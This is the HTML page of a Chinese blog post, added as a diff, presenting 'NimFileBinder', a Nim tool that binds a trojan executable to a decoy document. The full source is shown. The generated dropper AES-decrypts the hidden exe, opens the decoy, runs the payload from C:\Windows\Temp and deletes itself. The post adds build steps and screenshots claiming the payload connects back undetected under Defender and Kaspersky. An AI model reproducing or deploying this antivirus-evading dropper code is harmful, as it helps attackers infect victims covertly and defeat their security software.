@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>基于Nim语言的免杀打包器 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="0x01 原理概述基于nim语言实现将2个文件打包到一起，执行后将exe释放到C:\Windows\Temp，然后删除自身，同时运行exe和docx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于Nim语言的免杀打包器">
+<meta property="og:url" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x01 原理概述基于nim语言实现将2个文件打包到一起，执行后将exe释放到C:\Windows\Temp，然后删除自身，同时运行exe和docx">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111222512497.png">
+<meta property="og:image" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111222806858.png">
+<meta property="og:image" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111223117632.png">
+<meta property="og:image" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111223229687.png">
+<meta property="article:published_time" content="2022-11-12T02:17:31.000Z">
+<meta property="article:modified_time" content="2022-11-12T02:19:41.343Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="免杀对抗">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111222512497.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-基于Nim语言的免杀打包器" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/" class="article-date">
+  <time class="dt-published" datetime="2022-11-12T02:17:31.000Z" itemprop="datePublished">2022-11-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      基于Nim语言的免杀打包器
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-原理概述"><a href="#0x01-原理概述" class="headerlink" title="0x01 原理概述"></a>0x01 原理概述</h1><p>基于nim语言实现将2个文件打包到一起，执行后将exe释放到C:\Windows\Temp，然后删除自身，同时运行exe和docx</p>
+<span id="more"></span>
+
+<h1 id="0x02-工具优势"><a href="#0x02-工具优势" class="headerlink" title="0x02 工具优势"></a>0x02 工具优势</h1><p>01、基于nim语言，减少被杀软查杀的风险<br>02、打包器的核心代码部分会加密，并在内存中解密后运行<br>03、落地后删除自身，减少被传到沙盒的风险</p>
+<h1 id="0x03-完整代码"><a href="#0x03-完整代码" class="headerlink" title="0x03 完整代码"></a>0x03 完整代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"># File: NimFileBinder.nim</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">import strfmt</span><br><span class="line">import osproc</span><br><span class="line">import nimcrypto</span><br><span class="line"></span><br><span class="line">let help = &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |N i m F i l e B i n d e r|</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+ </span><br><span class="line"></span><br><span class="line">  It&#x27;s a FileBinder writen by Nim</span><br><span class="line">  And just a *rough* tool of learning Nim</span><br><span class="line"></span><br><span class="line">  Usage:</span><br><span class="line">    ./NimFileBinder &lt;evil&gt; &lt;NormalFile&gt; &lt;key&gt;</span><br><span class="line">      -h,--help  : help</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">func toByteSeq*(str: string): seq[byte] &#123;.inline.&#125; =</span><br><span class="line">  ## Converts a string to the corresponding byte sequence.</span><br><span class="line">  @(str.toOpenArrayByte(0, str.high))</span><br><span class="line"></span><br><span class="line">proc EncryptFile(File1, File2, key: string): void = </span><br><span class="line">  var</span><br><span class="line">   Content1 = readFile(File1)</span><br><span class="line">   Content2 = readFile(File2)</span><br><span class="line">   EnContent1 = encode(Content1)</span><br><span class="line">   EnContent2 = encode(Content2)</span><br><span class="line"></span><br><span class="line">  var</span><br><span class="line">    data: seq[byte] = toByteSeq(decode(EnContent1))</span><br><span class="line">    envkey: string = key</span><br><span class="line"></span><br><span class="line">    ectx, dctx: CTR[aes256]</span><br><span class="line">    key: array[aes256.sizeKey, byte]</span><br><span class="line">    iv: array[aes256.sizeBlock, byte]</span><br><span class="line">    plaintext = newSeq[byte](len(data))</span><br><span class="line">    enctext = newSeq[byte](len(data))</span><br><span class="line">    b64iv: string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  # Create Random IV</span><br><span class="line">  discard randomBytes(addr iv[0], 16)</span><br><span class="line">  # We do not need to pad data, `CTR` mode works byte by byte.</span><br><span class="line">  copyMem(addr plaintext[0], addr data[0], len(data))</span><br><span class="line"></span><br><span class="line">  # Expand key to 32 bytes using SHA256 as the KDF</span><br><span class="line">  var expandedkey = sha256.digest(envkey)</span><br><span class="line">  copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))</span><br><span class="line"></span><br><span class="line">  ectx.init(key, iv)</span><br><span class="line">  ectx.encrypt(plaintext, enctext)</span><br><span class="line">  ectx.clear()</span><br><span class="line"></span><br><span class="line">  b64iv = encode(iv)</span><br><span class="line"></span><br><span class="line">  var B64EnCryContent: string = encode(enctext)</span><br><span class="line"></span><br><span class="line">  var BinderTemplete: string = &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import winim</span><br><span class="line">import encodings</span><br><span class="line">import nimcrypto</span><br><span class="line"></span><br><span class="line">func toByteSeq*(str: string): seq[byte] &#123;&#125; =</span><br><span class="line">  ## Converts a string to the corresponding byte sequence.</span><br><span class="line">  @(str.toOpenArrayByte(0, str.high))</span><br><span class="line"></span><br><span class="line">var evilbase64 = &quot;&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">var data2: seq[byte] = toByteSeq(decode(evilbase64))</span><br><span class="line"></span><br><span class="line">var BindFilebase64 = &quot;&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">var deb64iv = decode(&quot;&#123;&#125;&quot;)</span><br><span class="line">var </span><br><span class="line">    envkey: string = &quot;&#123;&#125;&quot;</span><br><span class="line">    dctx: CTR[aes256]</span><br><span class="line">    key: array[aes256.sizeKey, byte]</span><br><span class="line">    iv: array[aes256.sizeBlock, byte]</span><br><span class="line">    crypttext = newSeq[byte](&#123;&#125;)</span><br><span class="line">    dectext = newSeq[byte](&#123;&#125;)</span><br><span class="line"></span><br><span class="line">copyMem(addr crypttext[0], addr data2[0], len(data2))</span><br><span class="line"></span><br><span class="line">var expandedkey = sha256.digest(envkey)</span><br><span class="line">copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))</span><br><span class="line">copyMem(addr iv[0], addr deb64iv[0], aes256.sizeBlock)</span><br><span class="line"></span><br><span class="line">dctx.init(key, iv)</span><br><span class="line">dctx.decrypt(crypttext, dectext)</span><br><span class="line">dctx.clear()</span><br><span class="line"></span><br><span class="line">let decoded_Bindfile = decode(BindFilebase64)</span><br><span class="line"></span><br><span class="line">var evilname: string = &quot;&#123;&#125;&quot;</span><br><span class="line">var Bindfilename: string = &quot;&#123;&#125;&quot;</span><br><span class="line"></span><br><span class="line">writeFile(Bindfilename, decoded_Bindfile)   </span><br><span class="line"></span><br><span class="line">var utf8evilname =convert(evilname,&quot;GB2312&quot;,&quot;UTF-8&quot;)</span><br><span class="line">var utf8Bindfilename =convert(Bindfilename,&quot;GB2312&quot;,&quot;UTF-8&quot;)</span><br><span class="line"></span><br><span class="line">WinExec(&quot;cmd /k start &quot; &amp; utf8Bindfilename, SW_HIDE); </span><br><span class="line">writeFile(r&quot;C:\\Windows\\Temp\\&quot; &amp; utf8evilname, dectext) </span><br><span class="line"></span><br><span class="line">#copyFile(&quot;C:\\Windows\\Temp\\calc.txt&quot;, &quot;C:\\Windows\\Temp\\calc.exe&quot;)</span><br><span class="line">#removeFile(&quot;C:\\Windows\\Temp\\calc.txt&quot;)</span><br><span class="line"></span><br><span class="line">WinExec(&quot;cmd /c C:\\Windows\\Temp\\&quot; &amp; utf8evilname, SW_HIDE); </span><br><span class="line">ShellExecute(0, &quot;open&quot;, &quot;cmd.exe&quot;, &quot;/c del outfile.exe&quot;, NULL, SW_HIDE)</span><br><span class="line">#WinExec(&quot;cmd.exe /c del temp.exe&quot;, SW_HIDE)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;.fmt(&quot;&#123;.inline.&#125;&quot;, B64EnCryContent, EnContent2, b64iv, envkey, len(data), len(data), File1, File2)</span><br><span class="line"></span><br><span class="line">  writeFile(r&quot;outfile.nim&quot;, BinderTemplete)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc CompileFile(): void = </span><br><span class="line">  let errC = execCmd(&quot;nim c --hints:off --cpu:amd64 -d:mingw --app:gui -d:danger -d:strip --opt:size --passc=-flto --passl=-flto &#123;&#125;&quot;.fmt(&quot;outfile.nim&quot;))</span><br><span class="line">  var rmhandle = tryRemoveFile(&quot;outfile.nim&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc main() =</span><br><span class="line">  if paramCount() == 3:</span><br><span class="line">    var</span><br><span class="line">      TraojanFile: string = paramStr(1)</span><br><span class="line">      NormalFile: string = paramStr(2)</span><br><span class="line">      Enkey: string = paramStr(3)</span><br><span class="line"></span><br><span class="line">    EncryptFile(TraojanFile, NormalFile, Enkey)</span><br><span class="line">    CompileFile()</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">  if paramCount() == 1 and (paramStr(1) == &quot;-h&quot; or paramStr(1) == &quot;--help&quot;):</span><br><span class="line">    echo help</span><br><span class="line">    return</span><br><span class="line">  </span><br><span class="line">  if paramCount() == 0:</span><br><span class="line">    echo help</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">  else:</span><br><span class="line">    echo &quot;  Expect two arguments\n  ex: ./NimFileBinder &lt;evil&gt; &lt;NormalFile&gt; &lt;key&gt;&quot;</span><br><span class="line">    return</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-Mac下编译"><a href="#0x04-Mac下编译" class="headerlink" title="0x04 Mac下编译"></a>0x04 Mac下编译</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install mingw</span><br><span class="line">brew install nim</span><br><span class="line">此时编译NimFileBinder.nim会提示缺少库，还需要通过nimble安装缺少的库</span><br><span class="line">nimble install strfmt</span><br><span class="line">依次安装完缺少的库后，可通过下述指令成功编译NimFileBinder.nim</span><br><span class="line">nim c --hints:off -d:release NimFileBinder.nim</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-效果展示"><a href="#0x05-效果展示" class="headerlink" title="0x05 效果展示"></a>0x05 效果展示</h1><p>打包如下</p>
+<p><img src="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111222512497.png" alt="image-20221111222512497"></p>
+<p>Defender下弹出文档，删除自身，并上线</p>
+<p><img src="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111222806858.png" alt="image-20221111222806858"></p>
+<p>卡巴斯基下弹出文档，删除自身，并上线</p>
+<p><img src="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111223117632.png" alt="image-20221111223117632"></p>
+<p>均可上线</p>
+<p><img src="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/image-20221111223229687.png" alt="image-20221111223229687"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/" data-id="cladavqnq0000ics6g7k7hh48" data-title="基于Nim语言的免杀打包器" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="tag">免杀对抗</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/11/12/%E5%BC%80%E6%BA%90%E7%9A%84beacon%E4%BA%8C%E5%BC%80%E9%A1%B9%E7%9B%AEgeacon-pro/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">开源的beacon二开项目geacon_pro</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E6%89%93%E7%82%B9/" rel="tag">Web打点</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="tag">免杀对抗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%82%B9%E6%BB%B4%E7%94%9F%E6%B4%BB/" rel="tag">点滴生活</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83/" rel="tag">红队环境</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Web%E6%89%93%E7%82%B9/" style="font-size: 10px;">Web打点</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" style="font-size: 16.67px;">免杀对抗</a> <a href="/tags/%E7%82%B9%E6%BB%B4%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">点滴生活</a> <a href="/tags/%E7%BA%A2%E9%98%9F%E7%8E%AF%E5%A2%83/" style="font-size: 13.33px;">红队环境</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/11/12/%E5%9F%BA%E4%BA%8ENim%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%8D%E6%9D%80%E6%89%93%E5%8C%85%E5%99%A8/">基于Nim语言的免杀打包器</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/12/%E5%BC%80%E6%BA%90%E7%9A%84beacon%E4%BA%8C%E5%BC%80%E9%A1%B9%E7%9B%AEgeacon-pro/">开源的beacon二开项目geacon_pro</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/01/%E5%A6%82%E4%BD%95%E7%94%A8C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84Shellcode-Loader/">如何用C语言实现自己的Shellcode Loader</a>
+          </li>
+        
+          <li>
+            <a href="/2022/11/01/CobaltStrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E6%8F%90%E9%86%92/">CobaltStrike服务端配置及上线微信提醒</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/24/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">ThinkPHP最新版6.0.13 0day利用链分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
